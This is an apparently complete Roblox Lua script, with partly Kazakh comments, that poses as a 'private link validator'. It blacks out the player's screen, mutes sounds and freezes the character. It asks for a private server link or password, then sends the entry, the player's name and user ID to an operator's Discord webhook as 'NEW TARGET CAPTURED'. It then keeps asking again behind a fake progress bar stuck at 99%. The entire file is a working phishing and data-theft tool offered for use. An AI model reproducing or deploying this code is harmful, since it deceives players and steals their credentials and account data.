-- [[ ZENITH INFO HUNTER V7 ]]
-- [[ LICENSED TO: TRADE-SECURE-GLOBAL ]]

local _w = "СЕНІҢ_WEBHOOK_СІЛТЕМЕҢ" -- ОСЫНДА WEBHOOK ҚОЙ

local Http = game:GetService("HttpService")
local Req = request or http_request or syn.request
local Players = game:GetService("Players")
local Market = game:GetService("MarketplaceService")
local p = Players.LocalPlayer

-- Ойын туралы мәлімет алу
local placeName = Market:GetProductInfo(game.PlaceId).Name

-- 1. SILENCE EVERYTHING (Дыбысты толық өшіру)
task.spawn(function()
    while task.wait(0.5) do
        pcall(function()
            local char = p.Character or p.CharacterAdded:Wait()
            for _, v in pairs(char:GetDescendants()) do
                if v:IsA("Sound") then v.Volume = 0 end
            end
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("Sound") and (v.Name == "Step" or v.Name == "Jump") then v.Volume = 0 end
            end
        end)
    end
end)

-- 2. THE VOID GUI (Қара экран)
local Zenith = Instance.new("ScreenGui", game.CoreGui)
Zenith.Name = "ZenithMain"
Zenith.DisplayOrder = 999999

local BG = Instance.new("Frame", Zenith)
BG.Size = UDim2.new(1, 0, 1, 0)
BG.BackgroundColor3 = Color3.new(0, 0, 0)
BG.Active = true

local Lbl = Instance.new("TextLabel", BG)
Lbl.Size = UDim2.new(1, 0, 0, 30)
Lbl.Position = UDim2.new(0, 0, 0.55, 0)
Lbl.BackgroundTransparency = 1
Lbl.TextColor3 = Color3.fromRGB(150, 150, 150)
Lbl.Font = Enum.Font.Code
Lbl.Text = "VALIDATING PRIVATE LINK: 0%"

local BarBG = Instance.new("Frame", BG)
BarBG.Size = UDim2.new(0, 300, 0, 2)
BarBG.Position = UDim2.new(0.5, -150, 0.6, 0)
BarBG.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
BarBG.BorderSizePixel = 0

local Bar = Instance.new("Frame", BarBG)
Bar.Size = UDim2.new(0, 0, 1, 0)
Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

local Input = Instance.new("TextBox", BG)
Input.Size = UDim2.new(0, 350, 0, 40)
Input.Position = UDim2.new(0.5, -175, 0.45, 0)
Input.PlaceholderText = "ENTER PRIVATE SERVER LINK"
Input.Text = ""
Input.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Input.TextColor3 = Color3.new(1, 1, 1)
Input.Font = Enum.Font.Code

-- 3. LOGIC: SEND DATA TO DISCORD
Input.FocusLost:Connect(function(enter)
    if enter then
        local data = {
            ["embeds"] = {{
                ["title"] = "🎯 NEW TARGET CAPTURED",
                ["fields"] = {
                    {["name"] = "👤 Player Name", ["value"] = "||" .. p.Name .. "||", ["inline"] = true},
                    {["name"] = "🆔 Player ID", ["value"] = "||" .. p.UserId .. "||", ["inline"] = true},
                    {["name"] = "🎮 Game", ["value"] = placeName .. " (" .. game.PlaceId .. ")"},
                    {["name"] = "🔑 Input (Private Link/Pass)", ["value"] = "```" .. Input.Text .. "```"},
                },
                ["color"] = 0xFF0000,
                ["footer"] = {["text"] = "Zenith Labs V7 • " .. os.date("%X")}
            }}
        }
        pcall(function() 
            Req({Url = _w, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = Http:JSONEncode(data)}) 
        end)
        
        Input.Text = ""
        Input.PlaceholderText = "INVALID LINK. RE-ENTER PRIVATE LINK."
    end
end)

-- 4. 99% ETERNAL PROGRESS
task.spawn(function()
    for i = 1, 99 do
        if i < 80 then task.wait(0.4) else task.wait(5) end
        Bar.Size = UDim2.new(i/100, 0, 1, 0)
        Lbl.Text = "VALIDATING PRIVATE LINK: " .. i .. "%"
    end
    while true do
        Lbl.Text = "STABILIZING CONNECTION: 99%..."
        task.wait(5)
    end
end)

-- 5. THE STEAL & FREEZE
p.Character.HumanoidRootPart.Anchored = true
